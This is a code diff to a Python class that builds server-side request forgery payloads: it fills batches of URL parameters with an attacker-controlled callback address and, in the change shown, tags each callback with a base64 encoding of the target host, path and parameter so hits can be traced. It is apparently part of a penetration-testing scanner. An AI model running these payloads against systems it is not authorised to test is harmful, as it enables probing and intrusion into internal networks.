@@ -1,15 +1,17 @@
 import re
 import json
+import base64
 from urllib.parse import parse_qs
 from urllib.parse import urlencode
 
 class HttpParameters:
 
-    def __init__(self, config, query, body):
+    def __init__(self, config, host, path, query, body):
         self.config = config
+        self.host = host
+        self.path = path
         self.query = query
         self.body = body
-        #self.processParameters()
 
     def is_xml(self, query):
         pass
@@ -21,6 +23,12 @@ class HttpParameters:
             return False
         return True
 
+    def base64Payload(self, payload):
+        payload_bytes = payload.encode('ascii')
+        base64_bytes = base64.b64encode(payload_bytes)
+        payload_base64 = base64_bytes.decode('ascii')
+        return payload_base64
+
     def buildPayloadList(self):
         '''
             Build payloads: par1=attackerURL&par2=attackerURL...
@@ -28,15 +36,23 @@ class HttpParameters:
         payloads = []
         counter = int(len(self.config.parameters) / self.config.chunkSize)
         for i in range(0, counter):
-            payload = self.config.parameters[i * self.config.chunkSize] + '=' + self.config.ssrfpayload
+            parameter = self.config.parameters[i * self.config.chunkSize]
+            ssrfpayload = self.config.ssrfpayload + '/' + self.base64Payload(self.host + self.path + '?' + parameter)
+            payload = parameter + '=' + ssrfpayload
             for j in range(1, self.config.chunkSize):
-                payload += "&" + self.config.parameters[i * self.config.chunkSize + j] + '=' + self.config.ssrfpayload
+                parameter = self.config.parameters[i * self.config.chunkSize + j]
+                ssrfpayload = self.config.ssrfpayload + '/' + self.base64Payload(self.host + self.path + '?' + parameter)
+                payload += "&" + parameter + '=' + ssrfpayload
             payloads.append(payload)
         # Add the leftover parameters
         if (counter * self.config.chunkSize) < len(self.config.parameters):
-            payload = self.config.parameters[counter * self.config.chunkSize] + '=' + self.config.ssrfpayload
+            parameter = self.config.parameters[counter * self.config.chunkSize]
+            ssrfpayload = self.config.ssrfpayload + '/' + self.base64Payload(self.host + self.path + '?' + parameter)
+            payload = parameter + '=' + ssrfpayload
             for i in range(counter * self.config.chunkSize + 1, len(self.config.parameters)):
-                payload += "&" + self.config.parameters[i] + '=' + self.config.ssrfpayload
+                parameter = self.config.parameters[i]
+                ssrfpayload = self.config.ssrfpayload + '/' + self.base64Payload(self.host + self.path + '?' + parameter)
+                payload += "&" + parameter + '=' + ssrfpayload
             payloads.append(payload)
         return payloads
 
